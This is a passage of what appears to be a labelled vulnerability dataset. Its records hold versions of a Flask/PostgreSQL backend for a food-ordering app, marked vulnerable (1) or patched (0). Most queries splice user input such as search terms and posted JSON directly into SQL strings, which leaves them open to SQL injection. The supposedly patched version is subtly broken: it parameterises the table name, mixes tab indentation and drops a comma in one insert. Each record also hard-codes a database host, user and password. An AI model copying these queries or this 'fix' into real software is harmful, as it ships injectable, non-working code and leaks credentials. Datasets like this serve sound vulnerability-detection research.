methods=['GET'])\ndef getAllListings():\n    all_rows = []\n\n    search_all = conn.cursor()\n    search_all.execute(\"SELECT {}, {}, {}, {},\"\n                         \" {}, {} FROM public.{}\".format(listing_listing_id_col,\n                                                                          listing_cook_id_col,\n                                                                          listing_food_name_col,\n                                                                          listing_price_col,\n                                                                          listing_location_col,\n                                                                          listing_image_col,\n                                                                          listing_table_name))\n\n    single_row = search_all.fetchone()\n\n    while single_row is not None:\n        all_rows.append(single_row)\n        single_row = search_all.fetchone()\n\n    search_all.close()\n\n    rows_to_json(all_rows)  # want to convert each row into a JSON string\n\n    return json.dumps({'data': all_rows})  # convert to string before returning\n\n\n#--------------------------------------------------- ADD LISTING ---------------------------------------------------#\n\n@app.route('/api/add', methods=['GET', 'POST'])\ndef addReq():\n    if request.method == \"GET\":\n        return printTables()\n    elif request.method == \"POST\":\n        addToDB(request.get_json())\n        conn.commit()\n        return \"Success\"\n\ndef encase_in_quotes(stringy):\n    return \"\\\"\" + stringy + \"\\\"\"\n\n\n\"\"\"\nAdds the Listing entry to the PSQL database with the given JSONdata\nJSON format is a dictionary where the keys are the column names of the listing, along with\na key \"tagList\" which is a list of tags:\n\n\"\"\"\n\n\ndef addToDB(json_data):\n    cur = conn.cursor()\n    json_dict = json_data\n\n    list_id = getListId()\n    cook_id = json_dict[removeQuotes(listing_cook_id_col)]\n    food_name = json_dict[removeQuotes(listing_food_name_col)]\n    price = json_dict[removeQuotes(listing_price_col)]\n    loc = json_dict[removeQuotes(listing_location_col)]\n    image = json_dict[removeQuotes(listing_image_col)]\n    tags = json_dict[\"tags\"]\n\n    inserted = (list_id, cook_id, food_name, price, loc, image)\n    #inserted = '(' + list_id + ',' + cook_id + ',' + food_name + ',' + price + ',' + loc + ',' + image + ')'\n\n    sql = \"INSERT INTO {} VALUES {}\".format(listing_table_name, str(inserted).encode(\"ascii\", \"replace\"))\n    cur.execute(sql)\n\n    addTags(tags, list_id)\n\n\ndef addTags(tag_list, listing_id):\n    \"\"\"\n    Adds a list of tags tag_list for a given listing with listing_id to the database\n    \"\"\"\n    cur = conn.cursor()\n    for x in tag_list:\n        sql = \"INSERT INTO {} VALUES {}\".format(listing_tags_table_name, str((listing_id, x)))\n        cur.execute(sql)\n\n\ndef getListId():\n    \"\"\" Returns an unused listing_id \"\"\"\n    cur = conn.cursor()\n    sql = \"SELECT max({}) FROM {}\".format(listing_listing_id_col,\n                                          listing_table_name)\n    cur.execute(sql)\n    maxID = cur.fetchone()\n    if maxID[0] == None:\n        return 1\n    else:\n        return maxID[0] + 1\n\n\ndef printTables():\n    cur = conn.cursor()\n    strout = \"--------------------------ListingTable---------------------------<br>\"\n    sql = \"SELECT * FROM {}\".format(listing_table_name)\n    cur.execute(sql)\n    listings = cur.fetchall()\n    for x in listings:\n        for y in x:\n            strout = strout + str(y) + \"||\t\"\n        strout = strout + \"<br>\"\n    sql = \"SELECT * FROM {}\".format(listing_tags_table_name)\n    cur.execute(sql)\n    listings = cur.fetchall()\n    strout += \"<br><br><br>--------------------------TagTable-------------------------<br>\"\n    for x in listings:\n        for y in x:\n            strout = strout + str(y) + \"\t\"\n\n        strout = strout + \"<br>\"\n    return strout\n\n\n#--------------------------------------------------- CANCEL ---------------------------------------------------#\n\n\n@app.route('/api/cancel/<int:clientId>/<int:listingId>', methods=['GET'])\ndef cancel(clientId, listingId):\n    \"\"\"\n    Cancels the order with specified client id and listing id and returns it.\n    returns 'order not found' if the client id and listing id do not exist as a key or if the listing has already\n    been canceled or fulfilled.\n    \"\"\"\n\n    in_progress = get_in_progress_order(clientId, listingId)\n\n    if in_progress:\n        cancel_order(clientId, listingId)\n        output = order_to_json(in_progress)  # want to convert each row into a JSON string\n\n        return output  # convert to string before returning\n    else:\n        return 'order not found'\n\n\ndef get_in_progress_order(clientId, listingId):\n    \"\"\"\n    Return the in progress order that corresponds with ClientId and ListingID\n    \"\"\"\n    matched_rows = []\n\n    order = conn.cursor()\n    order.execute(\"SELECT t1.\\\"ClientID\\\", t1.\\\"ListingID\\\", t1.\\\"Status\\\", t1.\\\"Time of Order\\\" from public.\\\"Order\\\"\"\n                  \" as t1 WHERE t1.\\\"ClientID\\\" = \" + str(clientId) + \" AND \\\"ListingID\\\" = \" + str(listingId) +\n                  \" AND t1.\\\"Status\\\" = \\'In progress\\'\")\n\n    order_row = order.fetchone()\n\n    while order_row is not None:\n        matched_rows.append(order_row)\n        order_row = order.fetchone()\n\n    order.close()\n\n    return matched_rows\n\n\ndef cancel_order(clientId, listingId):\n    \"\"\"\n    given a clientId and listingId cancel the order in progress associated with them\n    \"\"\"\n    order = conn.cursor()\n    order.execute(\n        \"UPDATE public.\\\"Order\\\" SET \\\"Status\\\" = 'Canceled' WHERE \\\"ClientID\\\" = \" + str(clientId) +\n        \" AND \\\"ListingID\\\" = \" + str(listingId) + \" AND \\\"Status\\\" = \\'In progress\\'\")\n    conn.commit()\n\n    order.close()\n\n\ndef order_to_json(rows):\n    \"\"\"\n    Takes in a list of tupples for the Orders schema and returns a json formated representation of the data.\n    \"\"\"\n    string = \"\"\n    for i in range(len(rows)):\n        string += json.dumps({'ClientID': rows[i][0],\n                              'ListingID': rows[i][1],\n                              'Status': rows[i][2],\n                              'DateTime': rows[i][3].__str__()})\n        if i != len(rows) - 1:\n            string += \",\"\n\n    return string\n\n\n#--------------------------------------------------- getUserOrders ---------------------------------------------------#\n\n\n@app.route('/api/getUserOrders/<int:clientId>', methods=['GET'])\ndef getUserOrders(clientId):\n    \"\"\"\n    Retruns a list of jsons representing tupples in the Orders table for the given client\n    \"\"\"\n\n    in_progress = queryOrderUsingClientID(clientId)\n\n    output = order_to_json(in_progress)  # want to convert each row into a JSON string\n\n    return \"[\" + output + \"]\"  # convert to string before returning\n\n\ndef queryOrderUsingClientID(clientId):\n    \"\"\"\n    Return a list of Order tuples belonging to the client with the given id.\n    \"\"\"\n    matched_rows = []\n\n    orders = conn.cursor()\n    orders.execute(\"SELECT t1.\\\"ClientID\\\", t1.\\\"ListingID\\\", t1.\\\"Status\\\", t1.\\\"Time of Order\\\" from public.\\\"Order\\\"\"\n                   \" as t1 WHERE t1.\\\"ClientID\\\" = \" + str(clientId))\n\n    order_row = orders.fetchone()\n\n    while order_row is not None:\n        matched_rows.append(order_row)\n        order_row = orders.fetchone()\n\n    orders.close()\n\n    return matched_rows\n\n\n#--------------------------------------------------- MARK AS COMPLETE ---------------------------------------------------#\n\n\ncompleted = \"\\'Completed\\'\"\n\n\n@app.route(\"/api/markComplete/<int:clientID>/<int:listingID>\", methods=['GET'])\ndef mark_as_complete(clientID, listingID):\n    \"\"\" A function that changes the status of the order with listing id listing_id to complete.\n        Returns \"Success\" on a sucessful change of the listing id's order to complete.\n\n        @param clientID: the client id number to change the status.\n        @param listingID: the listing id number to change the status.\n        @rtype: str\n    \"\"\"\n\n    sql = \\\n        \"\"\"\n            UPDATE public.{}\n            SET {} = {}\n            WHERE {} = {} AND {} = {}\n        \"\"\".format(order_table_name, order_status_col, completed, order_listing_id_col, str(listingID),\n                   order_client_id_col, str(clientID))\n\n    cur = conn.cursor()\n    try:\n        cur.execute(sql)\n        conn.commit()\n    except Exception as e:\n        raise Exception(e)\n\n    # Check to see if a row in the database has been updated.\n    if cur.rowcount == 0:\n        raise Exception(\"The status of listing id's order was not changed. ClientID or ListingID may be out of range.\")\n    return \"Success\"\n\n\n#--------------------------------------------------- SEARCH ---------------------------------------------------#\n\n\n@app.route('/api/search/<string:search_query>', methods=['GET'])\ndef search(search_query):\n    \"\"\"\n    Return a string representation of a list of JSON objects. This list contains\n    objects that correspond to listings that match names or tags in the search query.\n    \"\"\"\n    # separate words in search_query with '+' in place of spaces\n    search_terms = search_query.split('+')\n\n    # want to remove whitespace and empty elements from the list\n    search_terms_filtered = []\n\n    for search_term in search_terms:\n        if not search_term.isspace() and not search_term == '':\n            search_terms_filtered.append(search_term)\n\n    matched_rows_by_name = get_rows_from_name(search_terms_filtered)\n\n    matched_rows_by_tag = get_rows_from_tag(search_terms_filtered)\n\n    matched_rows = matched_rows_by_name + matched_rows_by_tag\n\n    unique_matched_rows = list(set(matched_rows))  # remove duplicate rows\n\n    rows_to_json(unique_matched_rows)  # want to convert each row into a JSON string\n\n    return json.dumps({'data': unique_matched_rows})  # convert to string before returning\n\n\ndef get_rows_from_name(search_terms):\n    \"\"\"\n    Return a list of listing tuples whose Food Names correspond to words in search_terms.\n    \"\"\"\n    matched_rows = []\n\n    for search_term in search_terms:\n        search_names = conn.cursor()\n        search_names.execute(\"SELECT t1.{}, t1.{}, t1.{}, t1.{},\"\n                             \" t1.{}, t1.{} FROM public.{} as t1\"\n                             \" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} \"\n                             \"WHERE UPPER(t1.{}) LIKE UPPER(\\'%{}%\\')\".format(listing_listing_id_col,\n                                                                              listing_cook_id_col,\n                                                                              listing_food_name_col,\n                                                                              listing_price_col,\n                                                                              listing_location_col,\n                                                                              listing_image_col,\n                                                                              listing_table_name,\n                                                                              listing_tags_table_name,\n                                                                              listing_listing_id_col,\n                                                                              listing_tags_listing_id_col,\n                                                                              listing_food_name_col,\n                                                                              search_term))\n\n        search_names_row = search_names.fetchone()\n\n        while search_names_row is not None:\n            matched_rows.append(search_names_row)\n            search_names_row = search_names.fetchone()\n\n        search_names.close()\n\n    return matched_rows\n\n\ndef get_rows_from_tag(search_terms):\n    \"\"\"\n    Return a list of listing tuples whose tags correspond to words in search_terms.\n    \"\"\"\n    matched_rows = []\n\n    for search_term in search_terms:\n        search_tags = conn.cursor()\n        search_tags.execute(\"SELECT t1.{}, t1.{}, t1.{}, t1.{},\"\n                             \" t1.{}, t1.{} FROM public.{} as t1\"\n                             \" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} \"\n                             \"WHERE UPPER(t2.{}) LIKE UPPER(\\'%{}%\\')\".format(listing_listing_id_col,\n                                                                              listing_cook_id_col,\n                                                                              listing_food_name_col,\n                                                                              listing_price_col,\n                                                                              listing_location_col,\n                                                                              listing_image_col,\n                                                                              listing_table_name,\n                                                                              listing_tags_table_name,\n                                                                              listing_listing_id_col,\n                                                                              listing_tags_listing_id_col,\n                                                                              listing_tags_tag_col,\n                                                                              search_term))\n\n        search_tags_row = search_tags.fetchone()\n\n        while search_tags_row is not None:\n            matched_rows.append(search_tags_row)\n            search_tags_row = search_tags.fetchone()\n\n        search_tags.close()\n\n    return matched_rows\n\n\ndef rows_to_json(rows):\n    \"\"\"\n    Mutate rows such that each tuple in rows is converted to a JSON string representing the same information.\n    \"\"\"\n    for i in range(len(rows)):\n        rows[i] = json.dumps({'ListingID': rows[i][0],\n                                'CookID': rows[i][1],\n                                'Food Name': rows[i][2],\n                                'Price': rows[i][3],\n                                'Location': rows[i][4],\n                                'Image': rows[i][5]})\n\n\nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\", port=80)\n    # host=\"0.0.0.0\", port=80\n/n/n/n", "label": 1}, {"id": "332a9f2c619be399ae94244bb8bd0977fc62bc16", "code": "backend-api/backend-api.py/n/nfrom flask import Flask\nfrom flask import request\nimport simplejson as json\nimport psycopg2\n\n\"\"\" Macros for relation and column names \"\"\"\nclient_table_name = \"\\\"Client\\\"\"\nclient_client_id_col = \"\\\"ClientID\\\"\"\nclient_client_rating_col = \"\\\"Client Rating\\\"\"\n\nclient_ratings_table_name = \"\\\"Client Ratings\\\"\"\nclient_ratings_client_id_col = \"\\\"ClientID\\\"\"\nclient_ratings_reviewer_id_col = \"\\\"ReviewerID\\\"\"\nclient_ratings_comments_col = \"\\\"Comments\\\"\"\nclient_ratings_rating_col = \"\\\"Rating\\\"\"\n\ncook_table_name = \"\\\"Cook\\\"\"\ncook_cook_id_col = \"\\\"CookID\\\"\"\ncook_cook_rating_col = \"\\\"Cook Rating\\\"\"\n\ncook_ratings_table_name = \"\\\"Cook Rating\\\"\"\ncook_ratings_cook_id_col = \"\\\"CookID\\\"\"\ncook_ratings_reviewer_id_col = \"\\\"ReviewerID\\\"\"\ncook_ratings_comments_col = \"\\\"Comments\\\"\"\ncook_ratings_rating_col = \"\\\"Rating\\\"\"\n\nlisting_table_name = \"\\\"Listing\\\"\"\nlisting_listing_id_col = \"\\\"ListingID\\\"\"\nlisting_cook_id_col = \"\\\"CookID\\\"\"\nlisting_food_name_col = \"\\\"Food Name\\\"\"\nlisting_price_col = \"\\\"Price\\\"\"\nlisting_location_col = \"\\\"Location\\\"\"\nlisting_image_col = \"\\\"Image\\\"\"\n\nlisting_tags_table_name = \"\\\"Listing Tags\\\"\"\nlisting_tags_listing_id_col = \"\\\"ListingID\\\"\"\nlisting_tags_tag_col = \"\\\"Tag\\\"\"\n\norder_table_name = \"\\\"Order\\\"\"\norder_client_id_col = \"\\\"ClientID\\\"\"\norder_listing_id_col = \"\\\"ListingID\\\"\"\norder_status_col = \"\\\"Status\\\"\"\norder_time_of_order_col = \"\\\"Time of Order\\\"\"\n\nuser_table_name = \"\\\"User\\\"\"\nuser_user_id_col = \"\\\"UserID\\\"\"\nuser_password_col = \"\\\"Password\\\"\"\nuser_fname_col = \"\\\"FName\\\"\"\nuser_lname_col = \"\\\"LName\\\"\"\n\n\"\"\" Database login details \"\"\"\ndb_host = \"mydbinstance.cqzm55sjgiup.us-east-1.rds.amazonaws.com\"\ndb_name = \"csc301breadwiener\"\ndb_user = \"csc301breadwiener\"\ndb_password = \"team7ithink\"\n\nconn = psycopg2.connect(host=db_host, database=db_name, user=db_user, password=db_password)\napp = Flask(__name__)\n\n##################################################\ndef removeQuotes(stringy):\n    \"\"\" Removes the first and last characters (double quotes) from a string, and then return it \"\"\"\n    return stringy[1:-1]\n\n\n#--------------------------------------------------- GET ALL LISTINGS ---------------------------------------------------#\n@app.route('/api/getAllListings', methods=['GET'])\ndef getAllListings():\n    all_rows = []\n\n    search_all = conn.cursor()\n    search_all.execute(\"SELECT {}, {}, {}, {},\"\n                         \" {}, {} FROM public.{}\".format(listing_listing_id_col,\n                                                                          listing_cook_id_col,\n                                                                          listing_food_name_col,\n                                                                          listing_price_col,\n                                                                          listing_location_col,\n                                                                          listing_image_col,\n                                                                          listing_table_name))\n\n    single_row = search_all.fetchone()\n\n    while single_row is not None:\n        all_rows.append(single_row)\n        single_row = search_all.fetchone()\n\n    search_all.close()\n\n    rows_to_json(all_rows)  # want to convert each row into a JSON string\n\n    return json.dumps({'data': all_rows})  # convert to string before returning\n\n\n#--------------------------------------------------- ADD LISTING ---------------------------------------------------#\n\n@app.route('/api/add', methods=['GET', 'POST'])\ndef addReq():\n    if request.method == \"GET\":\n        return printTables()\n    elif request.method == \"POST\":\n        addToDB(request.get_json())\n        conn.commit()\n        return \"Success\"\n\ndef encase_in_quotes(stringy):\n    return \"\\\"\" + stringy + \"\\\"\"\n\n\n\"\"\"\nAdds the Listing entry to the PSQL database with the given JSONdata\nJSON format is a dictionary where the keys are the column names of the listing, along with\na key \"tagList\" which is a list of tags:\n\n\"\"\"\n\n\ndef addToDB(json_data):\n    cur = conn.cursor()\n    json_dict = json_data\n\n    list_id = getListId()\n    cook_id = json_dict[removeQuotes(listing_cook_id_col)]\n    food_name = json_dict[removeQuotes(listing_food_name_col)]\n    price = json_dict[removeQuotes(listing_price_col)]\n    loc = json_dict[removeQuotes(listing_location_col)]\n    image = json_dict[removeQuotes(listing_image_col)]\n    tags = json_dict[\"tags\"]\n\n    sql = \"INSERT INTO %s VALUES (%s, %s, %s, %s, %s, %s)\"\n\tcur.execute(sql, (listing_table_name, list_id, cook_id, food_name, price, loc, image))\n\n    addTags(tags, list_id)\n\n\ndef addTags(tag_list, listing_id):\n    \"\"\"\n    Adds a list of tags tag_list for a given listing with listing_id to the database\n    \"\"\"\n    cur = conn.cursor()\n    for x in tag_list:\n        sql = \"INSERT INTO %s VALUES (%s %s)\"\n        cur.execute(sql, (listing_tags_table_name, listing_id, x))\n\n\ndef getListId():\n    \"\"\" Returns an unused listing_id \"\"\"\n    cur = conn.cursor()\n    sql = \"SELECT max({}) FROM {}\".format(listing_listing_id_col,\n                                          listing_table_name)\n    cur.execute(sql)\n    maxID = cur.fetchone()\n    if maxID[0] == None:\n        return 1\n    else:\n        return maxID[0] + 1\n\n\ndef printTables():\n    cur = conn.cursor()\n    strout = \"--------------------------ListingTable---------------------------<br>\"\n    sql = \"SELECT * FROM {}\".format(listing_table_name)\n    cur.execute(sql)\n    listings = cur.fetchall()\n    for x in listings:\n        for y in x:\n            strout = strout + str(y) + \"||\t\"\n        strout = strout + \"<br>\"\n    sql = \"SELECT * FROM {}\".format(listing_tags_table_name)\n    cur.execute(sql)\n    listings = cur.fetchall()\n    strout += \"<br><br><br>--------------------------TagTable-------------------------<br>\"\n    for x in listings:\n        for y in x:\n            strout = strout + str(y) + \"\t\"\n\n        strout = strout + \"<br>\"\n    return strout\n\n\n#--------------------------------------------------- CANCEL ---------------------------------------------------#\n\n\n@app.route('/api/cancel/<int:clientId>/<int:listingId>', methods=['GET'])\ndef cancel(clientId, listingId):\n    \"\"\"\n    Cancels the order with specified client id and listing id and returns it.\n    returns 'order not found' if the client id and listing id do not exist as a key or if the listing has already\n    been canceled or fulfilled.\n    \"\"\"\n\n    in_progress = get_in_progress_order(clientId, listingId)\n\n    if in_progress:\n        cancel_order(clientId, listingId)\n        output = order_to_json(in_progress)  # want to convert each row into a JSON string\n\n        return output  # convert to string before returning\n    else:\n        return 'order not found'\n\n\ndef get_in_progress_order(clientId, listingId):\n    \"\"\"\n    Return the in progress order that corresponds with ClientId and ListingID\n    \"\"\"\n    matched_rows = []\n\n    order = conn.cursor()\n    order.execute(\"SELECT t1.\\\"ClientID\\\", t1.\\\"ListingID\\\", t1.\\\"Status\\\", t1.\\\"Time of Order\\\" from public.\\\"Order\\\"\"\n                  \" as t1 WHERE t1.\\\"ClientID\\\" = \" + str(clientId) + \" AND \\\"ListingID\\\" = \" + str(listingId) +\n                  \" AND t1.\\\"Status\\\" = \\'In progress\\'\")\n\n    order_row = order.fetchone()\n\n    while order_row is not None:\n        matched_rows.append(order_row)\n        order_row = order.fetchone()\n\n    order.close()\n\n    return matched_rows\n\n\ndef cancel_order(clientId, listingId):\n    \"\"\"\n    given a clientId and listingId cancel the order in progress associated with them\n    \"\"\"\n    order = conn.cursor()\n    order.execute(\n        \"UPDATE public.\\\"Order\\\" SET \\\"Status\\\" = 'Canceled' WHERE \\\"ClientID\\\" = \" + str(clientId) +\n        \" AND \\\"ListingID\\\" = \" + str(listingId) + \" AND \\\"Status\\\" = \\'In progress\\'\")\n    conn.commit()\n\n    order.close()\n\n\ndef order_to_json(rows):\n    \"\"\"\n    Takes in a list of tupples for the Orders schema and returns a json formated representation of the data.\n    \"\"\"\n    string = \"\"\n    for i in range(len(rows)):\n        string += json.dumps({'ClientID': rows[i][0],\n                              'ListingID': rows[i][1],\n                              'Status': rows[i][2],\n                              'DateTime': rows[i][3].__str__()})\n        if i != len(rows) - 1:\n            string += \",\"\n\n    return string\n\n\n#--------------------------------------------------- getUserOrders ---------------------------------------------------#\n\n\n@app.route('/api/getUserOrders/<int:clientId>', methods=['GET'])\ndef getUserOrders(clientId):\n    \"\"\"\n    Retruns a list of jsons representing tupples in the Orders table for the given client\n    \"\"\"\n\n    in_progress = queryOrderUsingClientID(clientId)\n\n    output = order_to_json(in_progress)  # want to convert each row into a JSON string\n\n    return \"[\" + output + \"]\"  # convert to string before returning\n\n\ndef queryOrderUsingClientID(clientId):\n    \"\"\"\n    Return a list of Order tuples belonging to the client with the given id.\n    \"\"\"\n    matched_rows = []\n\n    orders = conn.cursor()\n    orders.execute(\"SELECT t1.\\\"ClientID\\\", t1.\\\"ListingID\\\", t1.\\\"Status\\\", t1.\\\"Time of Order\\\" from public.\\\"Order\\\"\"\n                   \" as t1 WHERE t1.\\\"ClientID\\\" = \" + str(clientId))\n\n    order_row = orders.fetchone()\n\n    while order_row is not None:\n        matched_rows.append(order_row)\n        order_row = orders.fetchone()\n\n    orders.close()\n\n    return matched_rows\n\n\n#--------------------------------------------------- MARK AS COMPLETE ---------------------------------------------------#\n\n\ncompleted = \"\\'Completed\\'\"\n\n\n@app.route(\"/api/markComplete/<int:clientID>/<int:listingID>\", methods=['GET'])\ndef mark_as_complete(clientID, listingID):\n    \"\"\" A function that changes the status of the order with listing id listing_id to complete.\n        Returns \"Success\" on a sucessful change of the listing id's order to complete.\n\n        @param clientID: the client id number to change the status.\n        @param listingID: the listing id number to change the status.\n        @rtype: str\n    \"\"\"\n\n    sql = \\\n        \"\"\"\n            UPDATE public.{}\n            SET {} = {}\n            WHERE {} = {} AND {} = {}\n        \"\"\".format(order_table_name, order_status_col, completed, order_listing_id_col, str(listingID),\n                   order_client_id_col, str(clientID))\n\n    cur = conn.cursor()\n    try:\n        cur.execute(sql)\n        conn.commit()\n    except Exception as e:\n        raise Exception(e)\n\n    # Check to see if a row in the database has been updated.\n    if cur.rowcount == 0:\n        raise Exception(\"The status of listing id's order was not changed. ClientID or ListingID may be out of range.\")\n    return \"Success\"\n\n\n#--------------------------------------------------- SEARCH ---------------------------------------------------#\n\n\n@app.route('/api/search/<string:search_query>', methods=['GET'])\ndef search(search_query):\n    \"\"\"\n    Return a string representation of a list of JSON objects. This list contains\n    objects that correspond to listings that match names or tags in the search query.\n    \"\"\"\n    # separate words in search_query with '+' in place of spaces\n    search_terms = search_query.split('+')\n\n    # want to remove whitespace and empty elements from the list\n    search_terms_filtered = []\n\n    for search_term in search_terms:\n        if not search_term.isspace() and not search_term == '':\n            search_terms_filtered.append(search_term)\n\n    matched_rows_by_name = get_rows_from_name(search_terms_filtered)\n\n    matched_rows_by_tag = get_rows_from_tag(search_terms_filtered)\n\n    matched_rows = matched_rows_by_name + matched_rows_by_tag\n\n    unique_matched_rows = list(set(matched_rows))  # remove duplicate rows\n\n    rows_to_json(unique_matched_rows)  # want to convert each row into a JSON string\n\n    return json.dumps({'data': unique_matched_rows})  # convert to string before returning\n\n\ndef get_rows_from_name(search_terms):\n    \"\"\"\n    Return a list of listing tuples whose Food Names correspond to words in search_terms.\n    \"\"\"\n    matched_rows = []\n\n    for search_term in search_terms:\n        search_names = conn.cursor()\n        search_names.execute(\"SELECT t1.{}, t1.{}, t1.{}, t1.{},\"\n                             \" t1.{}, t1.{} FROM public.{} as t1\"\n                             \" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} \"\n                             \"WHERE UPPER(t1.{}) LIKE UPPER(\\'%{}%\\')\".format(listing_listing_id_col,\n                                                                              listing_cook_id_col,\n                                                                              listing_food_name_col,\n                                                                              listing_price_col,\n                                                                              listing_location_col,\n                                                                              listing_image_col,\n                                                                              listing_table_name,\n                                                                              listing_tags_table_name,\n                                                                              listing_listing_id_col,\n                                                                              listing_tags_listing_id_col,\n                                                                              listing_food_name_col,\n                                                                              search_term))\n\n        search_names_row = search_names.fetchone()\n\n        while search_names_row is not None:\n            matched_rows.append(search_names_row)\n            search_names_row = search_names.fetchone()\n\n        search_names.close()\n\n    return matched_rows\n\n\ndef get_rows_from_tag(search_terms):\n    \"\"\"\n    Return a list of listing tuples whose tags correspond to words in search_terms.\n    \"\"\"\n    matched_rows = []\n\n    for search_term in search_terms:\n        search_tags = conn.cursor()\n        search_tags.execute(\"SELECT t1.{}, t1.{}, t1.{}, t1.{},\"\n                             \" t1.{}, t1.{} FROM public.{} as t1\"\n                             \" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} \"\n                             \"WHERE UPPER(t2.{}) LIKE UPPER(\\'%{}%\\')\".format(listing_listing_id_col,\n                                                                              listing_cook_id_col,\n                                                                              listing_food_name_col,\n                                                                              listing_price_col,\n                                                                              listing_location_col,\n                                                                              listing_image_col,\n                                                                              listing_table_name,\n                                                                              listing_tags_table_name,\n                                                                              listing_listing_id_col,\n                                                                              listing_tags_listing_id_col,\n                                                                              listing_tags_tag_col,\n                                                                              search_term))\n\n        search_tags_row = search_tags.fetchone()\n\n        while search_tags_row is not None:\n            matched_rows.append(search_tags_row)\n            search_tags_row = search_tags.fetchone()\n\n        search_tags.close()\n\n    return matched_rows\n\n\ndef rows_to_json(rows):\n    \"\"\"\n    Mutate rows such that each tuple in rows is converted to a JSON string representing the same information.\n    \"\"\"\n    for i in range(len(rows)):\n        rows[i] = json.dumps({'ListingID': rows[i][0],\n                                'CookID': rows[i][1],\n                                'Food Name': rows[i][2],\n                                'Price': rows[i][3],\n                                'Location': rows[i][4],\n                                'Image': rows[i][5]})\n\n\nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\", port=80)\n    # host=\"0.0.0.0\", port=80\n/n/n/n", "label": 0}, {"id": "332a9f2c619be399ae94244bb8bd0977fc62bc16", "code": "/backend-api/backend-api.py/n/nfrom flask import Flask\nfrom flask import request\nimport simplejson as json\nimport psycopg2\n\n\"\"\" Macros for relation and column names \"\"\"\nclient_table_name = \"\\\"Client\\\"\"\nclient_client_id_col = \"\\\"ClientID\\\"\"\nclient_client_rating_col = \"\\\"Client Rating\\\"\"\n\nclient_ratings_table_name = \"\\\"Client Ratings\\\"\"\nclient_ratings_client_id_col = \"\\\"ClientID\\\"\"\nclient_ratings_reviewer_id_col = \"\\\"ReviewerID\\\"\"\nclient_ratings_comments_col = \"\\\"Comments\\\"\"\nclient_ratings_rating_col = \"\\\"Rating\\\"\"\n\ncook_table_name = \"\\\"Cook\\\"\"\ncook_cook_id_col = \"\\\"CookID\\\"\"\ncook_cook_rating_col = \"\\\"Cook Rating\\\"\"\n\ncook_ratings_table_name = \"\\\"Cook Rating\\\"\"\ncook_ratings_cook_id_col = \"\\\"CookID\\\"\"\ncook_ratings_reviewer_id_col = \"\\\"ReviewerID\\\"\"\ncook_ratings_comments_col = \"\\\"Comments\\\"\"\ncook_ratings_rating_col = \"\\\"Rating\\\"\"\n\nlisting_table_name = \"\\\"Listing\\\"\"\nlisting_listing_id_col = \"\\\"ListingID\\\"\"\nlisting_cook_id_col = \"\\\"CookID\\\"\"\nlisting_food_name_col = \"\\\"Food Name\\\"\"\nlisting_price_col = \"\\\"Price\\\"\"\nlisting_location_col = \"\\\"Location\\\"\"\nlisting_image_col = \"\\\"Image\\\"\"\n\nlisting_tags_table_name = \"\\\"Listing Tags\\\"\"\nlisting_tags_listing_id_col = \"\\\"ListingID\\\"\"\nlisting_tags_tag_col = \"\\\"Tag\\\"\"\n\norder_table_name = \"\\\"Order\\\"\"\norder_client_id_col = \"\\\"ClientID\\\"\"\norder_listing_id_col = \"\\\"ListingID\\\"\"\norder_status_col = \"\\\"Status\\\"\"\norder_time_of_order_col = \"\\\"Time of Order\\\"\"\n\nuser_table_name = \"\\\"User\\\"\"\nuser_user_id_col = \"\\\"UserID\\\"\"\nuser_password_col = \"\\\"Password\\\"\"\nuser_fname_col = \"\\\"FName\\\"\"\nuser_lname_col = \"\\\"LName\\\"\"\n\n\"\"\" Database login details \"\"\"\ndb_host = \"mydbinstance.cqzm55sjgiup.us-east-1.rds.amazonaws.com\"\ndb_name = \"csc301breadwiener\"\ndb_user = \"csc301breadwiener\"\ndb_password = \"team7ithink\"\n\nconn = psycopg2.connect(host=db_host, database=db_name, user=db_user, password=db_password)\napp = Flask(__name__)\n\n##################################################\ndef removeQuotes(stringy):\n    \"\"\" Removes the first and last characters (double quotes) from a string, and then return it \"\"\"\n    return stringy[1:-1]\n\n\n#--------------------------------------------------- GET ALL LISTINGS ---------------------------------------------------#\n@app.route('/api/getAllListings', methods=['GET'])\ndef getAllListings():\n    all_rows = []\n\n    search_all = conn.cursor()\n    search_all.execute(\"SELECT {}, {}, {}, {},\"\n                         \" {}, {} FROM public.{}\".format(listing_listing_id_col,\n                                                                          listing_cook_id_col,\n                                                                          listing_food_name_col,\n                                                                          listing_price_col,\n                                                                          listing_location_col,\n                                                                          listing_image_col,\n                                                                          listing_table_name))\n\n    single_row = search_all.fetchone()\n\n    while single_row is not None:\n        all_rows.append(single_row)\n        single_row = search_all.fetchone()\n\n    search_all.close()\n\n    rows_to_json(all_rows)  # want to convert each row into a JSON string\n\n    return json.dumps({'data': all_rows})  # convert to string before returning\n\n\n#--------------------------------------------------- ADD LISTING ---------------------------------------------------#\n\n@app.route('/api/add', methods=['GET', 'POST'])\ndef addReq():\n    if request.method == \"GET\":\n        return printTables()\n    elif request.method == \"POST\":\n        addToDB(request.get_json())\n        conn.commit()\n        return \"Success\"\n\ndef encase_in_quotes(stringy):\n    return \"\\\"\" + stringy + \"\\\"\"\n\n\n\"\"\"\nAdds the Listing entry to the PSQL database with the given JSONdata\nJSON format is a dictionary where the keys are the column names of the listing, along with\na key \"tagList\" which is a list of tags:\n\n\"\"\"\n\n\ndef addToDB(json_data):\n    cur = conn.cursor()\n    json_dict = json_data\n\n    list_id = getListId()\n    cook_id = json_dict[removeQuotes(listing_cook_id_col)]\n    food_name = json_dict[removeQuotes(listing_food_name_col)]\n    price = json_dict[removeQuotes(listing_price_col)]\n    loc = json_dict[removeQuotes(listing_location_col)]\n    image = json_dict[removeQuotes(listing_image_col)]\n    tags = json_dict[\"tags\"]\n\n    sql = \"INSERT INTO %s VALUES (%s, %s, %s, %s, %s, %s)\"\n\tcur.execute(sql, (listing_table_name, list_id, cook_id, food_name, price, loc, image))\n\n    addTags(tags, list_id)\n\n\ndef addTags(tag_list, listing_id):\n    \"\"\"\n    Adds a list of tags tag_list for a given listing with listing_id to the database\n    \"\"\"\n    cur = conn.cursor()\n    for x in tag_list:\n        sql = \"INSERT INTO {} VALUES {}\".format(listing_tags_table_name, str((listing_id, x)))\n        cur.execute(sql)\n\n\ndef getListId():\n    \"\"\" Returns an unused listing_id \"\"\"\n    cur = conn.cursor()\n    sql = \"SELECT max({}) FROM {}\".format(listing_listing_id_col,\n                                          listing_table_name)\n  